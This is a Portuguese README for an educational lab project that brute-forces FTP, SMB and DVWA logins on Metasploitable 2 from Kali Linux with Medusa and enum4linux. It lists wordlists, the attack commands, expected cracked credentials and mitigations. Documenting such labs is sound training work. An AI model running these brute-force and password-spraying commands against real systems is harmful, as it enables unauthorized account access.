## Simulação de Ataques de Força Bruta com Kali Linux e Medusa

### Sobre o Projeto

Este projeto demonstra ataques de força bruta em ambiente controlado utilizando o Kali Linux e a ferramenta Medusa, explorando vulnerabilidades em Metasploitable 2 e DVWA.



### Objetivo

* Simular ataques reais
* Identificar falhas de segurança
* Aplicar conceitos de pentest
* Documentar resultados



## PASSO A PASSO (EXECUÇÃO)

###  1. Preparação do Ambiente

Instale no VirtualBox:

* Kali Linux
* Metasploitable 2

Configure ambas com:

* Rede: **Host-Only**



### 2. Descobrir IP da máquina alvo

No Metasploitable:

```bash
ip a
```

Exemplo de IP:

```
192.168.56.101
```



## 3. Ataque FTP (Força Bruta)

### Criar wordlist:

Users:

```bash
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
```

Conteúdo:

```
user
msfadmin
admin
oot
```

PassWord:

```bash
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
```

Conteúdo:

```
123456
password
qwerty
msfadmin
```



### Executar ataque:

```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
```



### Resultado esperado:

```
Login: msfadmin
Password: msfadmin
```


##  4. Ataque DVWA (Web)

Acesse no navegador:

```
http://192.168.56.101/dvwa
```

Login padrão:

```
admin / password
```


### Configurar:

* Security Level: LOW
* Ir em: Brute Force


### Testes realizados:

```
admin:password
admin:123456
```


### Resultado:

Login realizado com sucesso.


##  5. Ataque SMB (Password Spraying)

### Criar lista de usuários:

```bash
nano users.txt
```

Conteúdo:

```
root
msfadmin
user
guest
```


### Enumeração:

```bash
enum4linux 192.168.56.101
```


### Ataque:

```bash
medusa -h 192.168.56.101 -U users.txt -p password -M smbnt
```


### Resultado:

Usuários válidos identificados com senha fraca.


## Vulnerabilidades Encontradas

* Senhas fracas
* Falta de bloqueio por tentativas
* Serviços expostos
* Sem MFA


## Mitigação

* Senhas fortes
* Bloqueio após tentativas
* MFA
* Monitoramento
* Firewall


## Evidências

Adicionar na pasta `/images`:

* Ataque FTP
* Acesso DVWA
* Resultado Medusa
* Enumeração SMB


## Conclusão

Foi possível identificar falhas críticas em autenticação, reforçando a importância de boas práticas de segurança.


##  Aviso
Projeto educacional. Não utilizar em ambientes reais sem autorização.
